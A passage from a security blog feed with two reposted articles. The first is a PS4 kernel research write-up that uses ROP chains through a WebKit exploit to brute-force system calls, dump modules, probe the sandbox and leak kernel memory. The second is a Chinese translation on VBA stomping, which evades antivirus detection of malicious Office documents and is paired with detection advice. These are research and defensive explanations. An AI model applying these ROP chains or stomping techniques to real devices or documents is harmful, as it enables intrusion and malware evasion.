function calling convention: int syscall(); int getpid(void) { return syscall(20); } When writing ROP chains, we can use either convention: // Both will get the current process ID: chain.syscall(&quot;getpid&quot;, 20); chain.syscall(&quot;getpid&quot;, 0, 20); It’s good to be aware of this, because we can use whichever one is more convenient for the gadgets that are available. getpidJust by using system call 20, getpid(void), we can learn a lot about the kernel. The very fact that this system call works at all tells us that Sony didn’t bother mixing up the system call numbers as a means of security through obscurity (under the BSD license they could have done this without releasing the new system call numbers). So, we automatically have a list of system calls in the PS4 kernel to try. Secondly, by calling getpid(), restarting the browser, and calling it again, we get a return value 2 higher than the previous value. This tells us that the Internet Browser app actually consists of 2 separate processes: the WebKit core (which we take over), that handles parsing HTML and CSS, decoding images, and executing JavaScript for example, and another one to handle everything else: displaying graphics, receiving controller input, managing history and bookmarks, etc. Also, although FreeBSD has supported PID randomisation since 4.0, sequential PID allocation is the default behaviour. The fact that PID allocation is set to the default behaviour indicates that Sony likely didn’t bother adding any additional security enhancements such as those encouraged by projects like HardenedBSD, other than userland ASLR. How many custom system calls are there?The last standard FreeBSD 9 system call is wait6, number 532; anything higher than this must be a custom Sony system call. Invoking most of Sony’s custom system calls without the correct arguments will return error 0x16, &quot;Invalid argument&quot;; however, any compatibility or unimplemented system calls will report the “There is not enough free system memory” error. Through trial and error, I have found that system call number 617 is the last Sony system call, anything higher is unimplemented. From this, we can conclude that there are 85 custom Sony system calls in the PS4’s kernel (617 - 532). libkernel.sprxTo identify how custom system calls are used by libkernel, you must first remember that it is just a modification of the standard FreeBSD 9.0 libraries. Here’s an extract of _libpthread_init from thr_init.c: /* * Check for the special case of this process running as * or in place of init as pid = 1: */ if ((_thr_pid = getpid()) == 1) { /* * Setup a new session for this process which is * assumed to be running as root. */ if (setsid() == -1) PANIC(&quot;Can&apos;t set session ID&quot;); if (revoke(_PATH_CONSOLE) != 0) PANIC(&quot;Can&apos;t revoke console&quot;); if ((fd = __sys_open(_PATH_CONSOLE, O_RDWR)) &amp;lt; 0) PANIC(&quot;Can&apos;t open console&quot;); if (setlogin(&quot;root&quot;) == -1) PANIC(&quot;Can&apos;t set login to root&quot;); if (_ioctl(fd, TIOCSCTTY, (char *) NULL) == -1) PANIC(&quot;Can&apos;t set controlling terminal&quot;); } The same function can be found at offset 0x215F0 from libkernel.sprx. This is how the above extract looks from within a libkernel dump: call getpid mov cs:dword_5B638, eax cmp eax, 1 jnz short loc_2169F call setsid cmp eax, 0FFFFFFFFh jz loc_21A0C lea rdi, aDevConsole ; &quot;/dev/console&quot; call revoke test eax, eax jnz loc_21A24 lea rdi, aDevConsole ; &quot;/dev/console&quot; mov esi, 2 xor al, al call open mov r14d, eax test r14d, r14d js loc_21A3C lea rdi, aRoot ; &quot;root&quot; call setlogin cmp eax, 0FFFFFFFFh jz loc_21A54 mov edi, r14d mov esi, 20007461h xor edx, edx xor al, al call ioctl cmp eax, 0FFFFFFFFh jz loc_21A6C Reversing module dumps to analyse system callslibkernel isn’t completely open source though; there’s also a lot of custom code which can help disclose some of Sony’s system calls. Although this process will vary depending on the system call you are looking up; for some, it is fairly easy to get a basic understanding of the arguments that are passed to it. The system call wrapper will be declared somewhere in libkernel.sprx, and will almost always follow this template: 000000000000DB70 syscall_601 proc near 000000000000DB70 mov rax, 259h 000000000000DB77 mov r10, rcx 000000000000DB7A syscall 000000000000DB7C jb short error 000000000000DB7E retn 000000000000DB7F 000000000000DB7F error: 000000000000DB7F lea rcx, sub_DF60 000000000000DB86 jmp rcx 000000000000DB86 syscall_601 endp Note that the mov r10, rcx instruction doesn’t necessarily mean that the system call takes at least 4 arguments; all system call wrappers have it, even those that take no arguments, such as getpid. Once you’ve found the wrapper, you can look up xrefs to it: 0000000000011D50 mov edi, 10h 0000000000011D55 xor esi, esi 0000000000011D57 mov edx, 1 0000000000011D5C call syscall_601 0000000000011D61 test eax, eax 0000000000011D63 jz short loc_11D6A It’s good to look up several of these, just to make sure that the registers weren’t modified for something unrelated: 0000000000011A28 mov edi, 9 0000000000011A2D xor esi, esi 0000000000011A2F xor edx, edx 0000000000011A31 call syscall_601 0000000000011A36 test eax, eax 0000000000011A38 jz short loc_11A3F Consistently, the first three registers of the system call convention (rdi, rsi, and rdx) are modified before invoking the call, so we can conclude with reasonable confidence that it takes 3 arguments. For clarity, this is how we would replicate the calls in JuSt-ROP: chain.syscall(&quot;unknown&quot;, 601, 0x10, 0, 1); chain.syscall(&quot;unknown&quot;, 601, 9, 0, 0); As with most system calls, it will return 0 on success, as seen by the jz conditional after testing the return value. Looking up anything beyond than the amount of arguments will require a much more in-depth analysis of the code before and after the call to understand the context, but this should help you get started. Brute forcing system callsAlthough reverse engineering module dumps is the most reliable way to identify system calls, some aren’t referenced at all in the dumps we have so we will need to analyse them blindly. If we guess that a certain system call might take a particular set of arguments, we can brute force all system calls which return a certain value (0 for success) with the arguments that we chose, and ignore all which returned an error. We can also pass 0s for all arguments, and brute force all system calls which return useful errors such as 0xe, &quot;Bad address&quot;, which would indicate that they take at least one pointer. Firstly, we will need to execute the ROP chain as soon as the page loads. We can do this by attaching our function to the body element’s onload: &lt;body onload=&quot;exploit()&quot;&gt; Next we will need to perform a specific system call depending on an HTTP GET value. Although this can be done with JavaScript, I will demonstrate how to do this using PHP for simplicity: var Sony = 533; chain.syscall(&quot;Sony system call&quot;, Sony + &amp;lt;?php print($_GET[&quot;b&quot;]); ?&amp;gt;, 0, 0, 0, 0, 0, 0); chain.write_rax_ToVariable(0); Once the system call has executed, we can check the return value, and if it isn’t interesting, redirect the page to the next system call: if(chain.getVariable(0) == 0x16) window.location.assign(&quot;index.php?b=&quot; + (&amp;lt;?php print($_GET[&quot;b&quot;]); ?&amp;gt; + 1).toString()); Running the page with ?b=0 appended to the end will start the brute force from the first Sony system call. Although this method requires a lot of experimentation, by passing different values to some of the system calls found by brute forcing and analysing the new return values, there are a few system calls which you should be able to partially identify. System call 538As an example, I’ll take a look at system call 538, without relying on any module dumps. These are the return values depending on what is passed as the first argument: 0 - 0x16, &quot;Invalid argument&quot; 1 - 0xe, &quot;Bad address&quot; Pointer to 0s - 0x64 initially, but each time the page is refreshed this value increases by 1 Other potential arguments to try would be PID, thread ID, and file descriptor. Although most system calls will return 0 on success, due to the nature of the return value increasing after each time it is called, it seems like it is allocating a resource number, such as a file descriptor. The next thing to do would be to look at the data before and after performing the system call, to see if it has been written to. Since there is no change in the data, we can assume that it is an input for now. I then tried passing a long string as the first argument. You should always try this with every input you find because there is the possibility of discovering a buffer overflow. writeString(chain.data, &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;); chain.syscall(&quot;unknown&quot;, 538, chain.data, 0, 0, 0, 0, 0); The return value for this is 0x3f, ENAMETOOLONG. Unfortunately it seems that this system call correctly limits the name (32 bytes including NULL truncator), but it does tell us that it _is_ expecting a string, rather than a struct. We now have a few possibilities for what this system call is doing, the most obvious being something related to the filesystem (such as a custom mkdir or open), but this doesn’t seem particularly likely seeing as a resource was allocated even before we wrote any data to the pointer. To test whether the first parameter is a path, we can break it up with multiple / characters to see if this allows for a longer string: writeString(chain.data, &quot;aaaaaaaaaa/aaaaaaaaaa/aaaaaaaaaa&quot;); chain.syscall(&quot;unknown&quot;, 538, chain.data, 0, 0, 0, 0, 0); Since this also returns 0x3f, we can assume that the first argument isn’t a path; it is a name for something that gets allocated a sequential identifier. After analysing some more system calls, I found that the following all shared this exact same behaviour: 533 538 557 574 580 From the information that we have so far, it is almost impossible to pinpoint exactly what these system calls do, but as you run more tests, further information will slowly be revealed. To save you some time, system call 538 is allocating an event flag (and it doesn’t just take a name). Using general knowledge of how a kernel works, you can guess, and then verify, what the system calls are allocating (semaphores, mutexes, etc). Dumping additional modulesWe can dump additional modules by following these stages: Load the module Get the module’s base address Dump the module I’ve extracted and posted a list of all module names on psdevwiki. To load a module we will need to use the sceSysmoduleLoadModule function from libSceSysmodule.sprx + 0x1850. The first parameter is the module ID to load, and the other 3 should just be passed 0. The following JuSt-ROP method can be used to perform a function call: this.call = function(name, module, address, arg1, arg2, arg3, arg4, arg5, arg6) { console.log(&quot;call &quot; + name); if(typeof(arg1) !== &quot;undefined&quot;) this.add(&quot;pop rdi&quot;, arg1); if(typeof(arg2) !== &quot;undefined&quot;) this.add(&quot;pop rsi&quot;, arg2); if(typeof(arg3) !== &quot;undefined&quot;) this.add(&quot;pop rdx&quot;, arg3); if(typeof(arg4) !== &quot;undefined&quot;) this.add(&quot;pop rcx&quot;, arg4); if(typeof(arg5) !== &quot;undefined&quot;) this.add(&quot;pop r8&quot;, arg5); if(typeof(arg6) !== &quot;undefined&quot;) this.add(&quot;pop r9&quot;, arg6); this.add(module_bases[module] + address); } So, to load libSceAvSetting.sprx (0xb): chain.call(&quot;sceSysmoduleLoadModule&quot;, libSysmodule, 0x1850, 0xb, 0, 0, 0); Unfortunately, a fault will be triggered when trying to load certain modules; this is because the sceSysmoduleLoadModule function doesn’t load dependencies, so you will need to manually load them first. Like most system calls, this should return 0 on success. To see the loaded module ID that was allocated, we can use one of Sony’s custom system calls, number 592, to get a list of currently loaded modules: var countAddress = chain.data; var modulesAddress = chain.data + 8; // System call 592, getLoadedModules(int *destinationModuleHandles, int max, int *count); chain.syscall(&quot;getLoadedModules&quot;, 592, modulesAddress, 256, countAddress); chain.execute(function() { var count = getU64from(countAddress); for(var index = 0; index &amp;lt; count; index++) { logAdd(&quot;Module handle: 0x&quot; + getU32from(modulesAddress + index * 4).toString(16)); } }); Running this without loading any additional modules will produce the following list: 0x0, 0x1, 0x2, 0xc, 0xe, 0xf, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1e, 0x37, 0x59 But if we run it after loading module 0xb, we will see an additional entry, 0x65. Remember that module ID is not the same as loaded module handle. We can now use another of Sony’s custom system calls, number 593, which takes a module handle and a buffer, and fills the buffer with information about the loaded module, including its base address. Since the next available handle is always 0x65, we can hardcode this value into our chain, rather than having to store the result from the module list. The buffer must start with the size of the struct that should be returned, otherwise error 0x16 will be returned, &quot;Invalid argument&quot;: setU64to(moduleInfoAddress, 0x160); chain.syscall(&quot;getModuleInfo&quot;, 593, 0x65, moduleInfoAddress); chain.execute(function() { logAdd(hexDump(moduleInfoAddress, 0x160)); }); It will return 0 upon success, and fill the buffer with a struct which can be read like so: var name = readString(moduleInfoAddress + 0x8); var codeBase = getU64from(moduleInfoAddress + 0x108); var codeSize = getU32from(moduleInfoAddress + 0x110); var dataBase = getU64from(moduleInfoAddress + 0x118); var dataSize = getU32from(moduleInfoAddress + 0x120); We now have everything we need to dump the module! dump(codeBase, codeSize + dataSize); There is another Sony system call, number 608, which works in a similar way to 593, but provides slightly different information about the loaded module: setU64to(moduleInfoAddress, 0x1a8); chain.syscall(&quot;getDifferentModuleInfo&quot;, 608, 0x65, 0, moduleInfoAddress); logAdd(hexDump(moduleInfoAddress, 0x1a8)); It’s not clear what this information is. Browsing the filesystemThe PS4 uses the standard FreeBSD 9.0 system calls for reading files and directories. However, whilst using read for some directories such as /dev/ will work, others, such as / will fail. I’m not sure why this is, but if we use getdents instead of read for directories, it will work much more reliably: writeString(chain.data, &quot;/dev/&quot;); chain.syscall(&quot;open&quot;, 5, chain.data, 0, 0); chain.write_rax_ToVariable(0); chain.read_rdi_FromVariable(0); chain.syscall(&quot;getdents&quot;, 272, undefined, chain.data + 0x10, 1028); This is the resultant memory: 0000010: 0700 0000 1000 0205 6469 7073 7700 0000 ........dipsw... 0000020: 0800 0000 1000 0204 6e75 6c6c 0000 0000 ........null.... 0000030: 0900 0000 1000 0204 7a65 726f 0000 0000 ........zero.... 0000040: 0301 0000 0c00 0402 6664 0000 0b00 0000 ........fd...... 0000050: 1000 0a05 7374 6469 6e00 0000 0d00 0000 ....stdin....... 0000060: 1000 0a06 7374 646f 7574 0000 0f00 0000 ....stdout...... 0000070: 1000 0a06 7374 6465 7272 0000 1000 0000 ....stderr...... 0000080: 1000 0205 646d 656d 3000 0000 1100 0000 ....dmem0....... 0000090: 1000 0205 646d 656d 3100 0000 1300 0000 ....dmem1....... 00000a0: 1000 0206 7261 6e64 6f6d 0000 1400 0000 ....random...... 00000b0: 1000 0a07 7572 616e 646f 6d00 1600 0000 ....urandom..... 00000c0: 1400 020b 6465 6369 5f73 7464 6f75 7400 ....deci_stdout. 00000d0: 1700 0000 1400 020b 6465 6369 5f73 7464 ........deci_std 00000e0: 6572 7200 1800 0000 1400 0209 6465 6369 err.........deci 00000f0: 5f74 7479 3200 0000 1900 0000 1400 0209 _tty2........... 0000100: 6465 6369 5f74 7479 3300 0000 1a00 0000 deci_tty3....... 0000110: 1400 0209 6465 6369 5f74 7479 3400 0000 ....deci_tty4... 0000120: 1b00 0000 1400 0209 6465 6369 5f74 7479 ........deci_tty 0000130: 3500 0000 1c00 0000 1400 0209 6465 6369 5...........deci 0000140: 5f74 7479 3600 0000 1d00 0000 1400 0209 _tty6........... 0000150: 6465 6369 5f74 7479 3700 0000 1e00 0000 deci_tty7....... 0000160: 1400 020a 6465 6369 5f74 7479 6130 0000 ....deci_ttya0.. 0000170: 1f00 0000 1400 020a 6465 6369 5f74 7479 ........deci_tty 0000180: 6230 0000 2000 0000 1400 020a 6465 6369 b0.. .......deci 0000190: 5f74 7479 6330 0000 2200 0000 1400 020a _ttyc0..&quot;....... 00001a0: 6465 6369 5f73 7464 696e 0000 2300 0000 deci_stdin..#... 00001b0: 0c00 0203 6270 6600 2400 0000 1000 0a04 ....bpf.$....... 00001c0: 6270 6630 0000 0000 2900 0000 0c00 0203 bpf0....)....... 00001d0: 6869 6400 2c00 0000 1400 0208 7363 655f hid.,.......sce_ 00001e0: 7a6c 6962 0000 0000 2e00 0000 1000 0204 zlib............ 00001f0: 6374 7479 0000 0000 3400 0000 0c00 0202 ctty....4....... 0000200: 6763 0000 3900 0000 0c00 0203 6463 6500 gc..9.......dce. 0000210: 3a00 0000 1000 0205 6462 6767 6300 0000 :.......dbggc... 0000220: 3e00 0000 0c00 0203 616a 6d00 4100 0000 &gt;.......ajm.A... 0000230: 0c00 0203 7576 6400 4200 0000 0c00 0203 ....uvd.B....... 0000240: 7663 6500 4500 0000 1800 020d 6e6f 7469 vce.E.......noti 0000250: 6669 6361 7469 6f6e 3000 0000 4600 0000 fication0...F... 0000260: 1800 020d 6e6f 7469 6669 6361 7469 6f6e ....notification 0000270: 3100 0000 5000 0000 1000 0206 7573 6263 1...P.......usbc 0000280: 746c 0000 5600 0000 1000 0206 6361 6d65 tl..V.......came 0000290: 7261 0000 8500 0000 0c00 0203 726e 6700 ra..........rng. 00002a0: 0701 0000 0c00 0403 7573 6200 c900 0000 ........usb..... 00002b0: 1000 0a07 7567 656e 302e 3400 0000 0000 ....ugen0.4..... 00002c0: 0000 0000 0000 0000 0000 0000 0000 0000 ................ You can read some of these devices, for example: reading /dev/urandom will fill the memory with random data. It is also possible to parse this memory to create a clean list of entries; look at browser.html in the repository for a complete file browser: Unfortunately, due to sandboxing we don’t have complete access to the file system. Trying to read files and directories that do exist but are restricted will give you error 2, ENOENT, &quot;No such file or directory&quot;. We do have access to a lot of interesting stuff though including encrypted save data, trophies, and account information. I will go over more of the filesystem in my next article. SandboxingAs well as file related system calls failing for certain paths, there are other reasons for a system call to fail. Most commonly, a disallowed system call will just return error 1, EPERM, &quot;Operation not permitted&quot;; such as trying to use ptrace, but other system calls may fail for different reasons: Compatibilty system calls are disabled. If you are trying to call mmap for example, you must use system call number 477, not 71 or 197; otherwise a segfault will be triggered. Other system calls such as exit will also trigger a fault: chain.syscall(&quot;exit&quot;, 1, 0); Trying to create an SCTP socket will return error 0x2b, EPROTONOSUPPORT, indicating that SCTP sockets have been disabled in the PS4 kernel: //int socket(int domain, int type, int protocol); //socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP); chain.syscall(&quot;socket&quot;, 97, 2, 1, 132); And although calling mmap with PROT_READ | PROT_WRITE | PROT_EXEC will return a valid pointer, the PROT_EXEC flag is ignored. Reading its protection will return 3 (RW), and any attempt to execute the memory will trigger a segfault: chain.syscall(&quot;mmap&quot;, 477, 0, 4096, 1 | 2 | 4, 4096, -1, 0); chain.write_rax_ToVariable(0); chain.read_rdi_FromVariable(0); chain.add(&quot;pop rax&quot;, 0xfeeb); chain.add(&quot;mov [rdi], rax&quot;); chain.add(&quot;mov rax, rdi&quot;); chain.add(&quot;jmp rax&quot;); The list of open source software used in the PS4 doesn’t list any kind of sandboxing software like Capsicum, so the PS4 must use either pure FreeBSD jails, or some kind of custom, proprietary, sandboxing system (unlikely). JailsWe can prove the existence of FreeBSD jails being actively used in the PS4’s kernel through the auditon system call being impossible to execute within a jailed environment: chain.syscall(&quot;auditon&quot;, 446, 0, 0, 0); The first thing the auditon system call does is check jailed here, and if so, return ENOSYS: if (jailed(td-&gt;td_ucred)) return (ENOSYS); Otherwise the system call would most likely return EPERM from the mac_system_check_auditon here: error = mac_system_check_auditon(td-&gt;td_ucred, uap-&gt;cmd); if (error) return (error); Or from the priv_check here: error = priv_check(td, PRIV_AUDIT_CONTROL); if (error) return (error); The absolute furthest that the system call could reach would be immediately after the priv_check, here, before returning EINVAL due to the length argument being 0: if ((uap-&gt;length &lt;= 0) || (uap-&gt;length &gt; sizeof(union auditon_udata))) return (EINVAL); Since mac_system_check_auditon and priv_check will never return ENOSYS, having the jailed check pass is the only way ENOSYS could be returned. When executing the chain, ENOSYS _is_ returned (0x48). This tells us that whatever sandbox system the PS4 uses is at least based on jails because the jailed check passes. FreeBSD 9.0 kernel exploitsBefore trying to look for new vulnerabilities in the FreeBSD 9.0 kernel source code, we should first check whether any of the kernel vulnerabilities already found could be used on the PS4. We can immediately dismiss some of these for obvious reasons: FreeBSD 9.0-9.1 mmap/ptrace - Privilege Escalation Exploit - this won’t work since, as previously stated, we don’t have access to the ptrace system call. FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit - won’t work because the PS4 uses an AMD processor. FreeBSD Kernel - Multiple Vulnerabilities - maybe the first vulnerability will lead to something, but the other 2 rely on SCTP sockets, which the PS4 kernel has disabled (as previously stated). However, there are some smaller vulnerabilites, which could lead to something: getloginOne vulnerability which looks easy to try is using the getlogin system call to leak a small amount of kernel memory. The getlogin system call is intended to copy the login name of the current session to userland memory, however, due to a bug, the whole buffer is always copied, and not just the size of the name string. This means that we can read some uninitialised data from the kernel, which might be of some use. Note that the system call (49) is actually int getlogin_r(char *name, int len); and not char *getlogin(void);. So, let’s try copying some kernel memory into an unused part of userland memory: chain.syscall(&quot;getlogin&quot;, 49, chain.data, 17); Unfortunately 17 bytes is the most data we can get, since: Login names are limited to MAXLOGNAME (from &amp;lt;sys/param.h&amp;gt;) characters, currently 17 including null. – FreeBSD Man Pages After executing the chain, the return value was 0, which means that the system call worked! An excellent start. Now let’s take a look at the memory which we pointed to: Before executing the chain: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 After executing the chain: 72 6f 6f 74 00 fe ff ff 08 62 61 82 ff ff ff ff 00 After decoding the first 4 bytes as ASCII: root So the browser is executed as root! That was unexpected. But more interestingly, the memory leaked looks like a pointer to something in the kernel, which is always the same each time the chain is run; this is evidence to support Yifanlu’s claims that the PS4 has no Kernel ASLR! SummaryFrom the information currently available, the PS4’s kernel seems to be very similar to the stock FreeBSD 9.0 kernel. Importantly, the differences that are present appear to be from standard kernel configuration changes (such as disabling SCTP sockets), rather than from modified code. Sony have also added several of their own custom system calls to the kernel, but apart from this, the rest of the kernel seems fairly untouched. In this respect, I’m inclined to believe that the PS4 shares most of the same juicy vulnerabilities as FreeBSD 9.0’s kernel! Unfortunately, most kernel exploits cannot be triggered from the WebKit entry point that we currently have due to sandboxing constraints (likely to be just stock FreeBSD jails). And with FreeBSD 10 being out, it’s unlikely that anyone is stashing away any private exploits for FreeBSD 9, so unless a new one is suddenly released, we’re stuck with what is currently available. The best approach from here seems to be reverse engineering all of the modules which can be dumped, in order to document as many of Sony’s custom system calls as possible; I have a hunch that we will have more luck targeting these, than the standard FreeBSD system calls. Recently Jaicrab has discovered two UART ports on the PS4 which shows us that there are hardware hackers interested in the PS4. Although the role of hardware hackers has traditionally been to dump the RAM of a system, like with the DSi, which we can already do thanks to the WebKit exploit, there’s also the possibility of a hardware triggered kernel vulnerability being found, like geohot’s original PS3 hypervisor hack. It remains most likely that a kernel exploit will be found on the PS4 through system call vulnerabilities though. 原文地址]]></content>
      <categories>
        <category>硬件分析</category>
      </categories>
      <tags>
        <tag>外文翻译</tag>
        <tag>漏洞挖掘</tag>
        <tag>PS4</tag>
        <tag>硬件分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VBA Stomping 简介]]></title>
    <url>%2F2019%2F04%2F30%2FVBA-Stomping%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[原文标题 VBA Stomping — Advanced Maldoc Techniques (Oct 6, 2018) 作者：Kirk Sayre @bigmacjpg，Harold Ogden @haroldogden 和 Carrie Roberts @OrOneEqualsOne VBA Stomping 是一种可以绕过反病毒检测恶意文档生成技术，它最初由 Vesselin Bontchev 博士引起我们的注意（见此处）。VBA stomping 是指销毁 Microsoft Office 文档中的 VBA 源代码，只留下文档文件中称为 p-code 的宏代码的编译版本。在这种情况下，仅基于VBA源代码的恶意文档检测会失败。在这篇博文中，我们将详细演示 VBA stomping 并介绍一些其他技术。 VBA Stomping首先，我们将在一个简单的非恶意宏上演示 VBA Stomping。此文档在打开时显示带有文本 ABC 的消息框。VBA 源代码和生成的消息框如下所示。 现在我们修改上面显示的VBA源代码，同时保持中间 p-code 不变。我们将集中讨论当前的 .docx/.xlsx/.docm/.xlsm（Office 2007 以上）格式。但是，此处讨论的技术可以轻松应用于较旧的 .doc/.xls格式。在 Office 2007 以上文件中，VBA 源代码和 p-code 通常位于名为 vbaProject.bin 的文件中。请注意这是默认文件名，可以被重命名。如果要手动修改此文件，我们需要首先解压 .docm/.xlsm 文件，然后在十六进制编辑器中打开 vbaProject.bin 文件。在此示例中，我们将 ABC 改为 XYZ，但仅限于存储 VBA 源代码的位置，而不是 p-code 部分。VBA 源代码以压缩形式存储，即下图中不可打印或奇怪的字符。 现在我们已经手动编辑了 VBA 源代码将 ABC 更改为 XYZ，我们打开文档并在单击“启用内容”按钮之前检查 VBA 源代码。 我们打开文档但未启用宏。在代码编辑器中检查宏，代码显示宏将显示带有文本 XYZ 的消息框，但事实并非如此。实际上，只要启用了内容，就会显示一个 ABC 的消息框，并且代码编辑器中的源代码会更新以匹配！ 源代码表示 XYZ 将显示在消息框中，但显示 ABC 。到底是怎么回事？ 正如 Bontchev 博士所解释的那样，只要 p-code 与系统上的当前 VBA 版本兼容，文档实际执行的是存储的 p-code。此外，宏编辑器中显示的内容（一旦启用内容）并不是解压的 VBA 源代码，而是反编译的 p-code。 如果我们在不同版本的 Word（使用不同的 VBA 版本）中打开文档，则 p-code 将不可重用。这将强制将 VBA 源代码解压缩并重新编译为 p-code，从而在消息框中显示 XYZ。所以现在我们有一个文档，在一个版本的Office上显示 ABC，但在另一个版本上显示 XYZ。 请注意，这很重要。使用 VBA Stomping 技术的恶意文档只能使用用于创建文档时相同的 VBA 版本执行。 我们可以通过在恶意文档生成之前对目标进行侦察来确定要使用的适当 Office 版本适当 Office 版本；或者通过生成具有多个 Office 版本的恶意文档并将其喷射到目标上来解决此限制。 从防守角度看 VBA stomping 是什么效果呢？通常恶意文档检测仅基于 VBA 源代码。甚至许多可用于分析文档的工具都无法识别 VBA 源和 p-code 之间的差异。由 Philippe Lagadec 编写的 olevba 脚本对篡改文档的分析仅显示了解压缩的源代码，且缺少 p-code 细节。 除非使用 p-code dumper 插件运行，否则 Didier Stevens 的 Python 脚本 oledump.py 也会给出类似的结果。在使用该插件的情况下，输出给出了一些指示，即 p-code 将使消息框显示 ABC，如下图所示。 Bontchev 博士发布了一个名为 pcodedmp.py 的 Python 脚本用于显示 p-code，如下图所示。输出可以显示操作名称而不是上面的操作码。 我们可以通过用零或随机字节覆盖 VBA 源代码来完全擦除（stomp），而不仅仅是修改它。以下截图显示了如何在十六进制编辑器中手动执行此操作。 在这种情况下，VBA 编辑器根本不显示宏代码，但启用内容后仍然显示带有文本 ABC 的消息框。现在，我们在此文件上重新运行 olevba，结果不显示任何VBA源代码，并显示“未找到可疑关键字或 IOC”，而不是之前突出显示我们在使用可疑关键字（AutoOpen）。 这个问题有多严重?我们现在将更深入地了解 Office 如何使用压缩的 VBA 源代码和 p-code。稍后当我们讨论如何滥用 Office 功能来轻松修改恶意文档以欺骗许多 AV 扫描时，这将会发挥作用。 Office 文档包含两个用于提取 VBA 的位置，即压缩的 VBA 源代码和 p-code。下表详细说明了在以下情况下使用哪个 VBA 数据源： 从该表中我们可以看到，如果我们有有效的 p-code，则在启用宏时它会忽略压缩的 VBA 源代码，并通过运行 p-code 来执行所有宏功能。作为攻击者，这告诉我们，我们可以完全破坏或修改压缩的 VBA 源代码，并且仍然让我们的恶意文档执行其指定的任务。 现实案例上述表明这适用于简单示例，但这真的是威胁吗？让我们通过使用已知的恶意文档将其提升到新的水平。在这种情况下，我们将从最近的 Emotet 恶意文档开始，它目前在 Virus total 上被 36/59 的供应商检测为恶意。 如果我们使用这个文档并且如上所述方法简单地处理 VBA 源代码，那么检测率将降至 58 种防病毒解决方案中的 7 种！ 如您所见，这给网络防御者带来了严重的问题。即使手动分析此类文档也可能存在问题。此时显而易见的问题是可以通过工具自动执行 VBA stomping 还是我们必须手动编辑 Office 文档？ 这个问题的答案是肯定的。我们开发了一个 POC 工具来自动在任何 Office 文档中处理压缩的 VBA 源代码（它被用于 VBA stomping 示例的 Emotet 文档，我们不会发布此实用程序）。考虑到自动化 VBA stomping 十分容易，这是一个真正的威胁。 变得更糟考虑恶意文档被设计为在执行恶意有效载荷之后立即关闭 MS Word 的情况。与 VBA stomping 结合使用时，没有脱机的 VBA 源代码提取工具将显示 VBA 源代码，并且在启用宏之前，VBA 源代码甚至不会显示在 Office 宏编辑器窗口中。但是启用宏会导致 Word 立即退出而不提供查看反编译源的机会。虽然我们已经证明“类似汇编”的 p-code 是可提取的，但是 p-code 很难解释，并且无法在 VBA 调试器中被分析。此外 p-code 仅在特定的VBA版本上运行。出于这些原因，访问 VBA 源代码对分析人员来说是一个很大的好处。但是如何才能为这样的文件做到这一点呢？ 经过一些实验，我们找到了一个简单的解决方案，可以在宏启用后立即停止 MS Word 执行任何方法。请注意，此解决方案适用于 Office 2007 以上的文档，我们研究解决较旧的文档格式。Office 2007 以上的解决方案是从 .docm 文件的 word 目录中删除 vbaData.xml 文件，如下所示（这可以通过 7-Zip 程序完成，而无需手动解压缩和重新压缩文档）。 现在我们可以打开文档并启用内容，从而在 VBA 代码编辑器中显示反编译的 p-code，但不执行代码。如果恶意软件作者已采取措施阻止分析人员访问 VBA 源代码，则这种方法可以节省时间。 删除 vbaData.xml 的一个有趣的副作用是它会导致 MS Word 在宏对话框中错误地列出没有宏（参见下图）。 检测我们编写了一个开源工具，用于检测名为 VBA Seismograph 的 Office 文档中的 VBA stomping。此工具已在 Ubuntu 16.04 下测试，它检测声明的函数/变量名称、字符串文字以及出现在已编译的 p-code 和 Office 文档的 VBA 源代码中的注释行之间的差异。该工具可在这里找到。 总结在这篇博客文章中，我们演示了如何修改或销毁 Office 文档中压缩的 VBA 源代码，来绕过 AV 扫描，并使恶意文档的手动分析更加困难。对此技术的防御涉及检测和标记具有有效 p-code 但无效或缺少 VBA 源代码的文档，或更一般地，检查压缩 VBA 源代码与反编译 p-code 之间的差异。目前，我们还没有发现任何进行此项检查的商用 AV 解决方案，因此这是 AV 扫描解决方案可以改进的领域。 参考资料 https://vbastomp.com/ 原文地址]]></content>
      <categories>
        <category>安全技术</category>
      </categories>
      <tags>
        <tag>外文翻译</tag>
        <tag>VBA</tag>
        <tag>安全技术</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AFL 及其相关拓展项目总结]]></title>
    <url>%2F2019%2F04%2F29%2FAFL%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E6%8B%93%E5%B1%95%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93%2F</url>
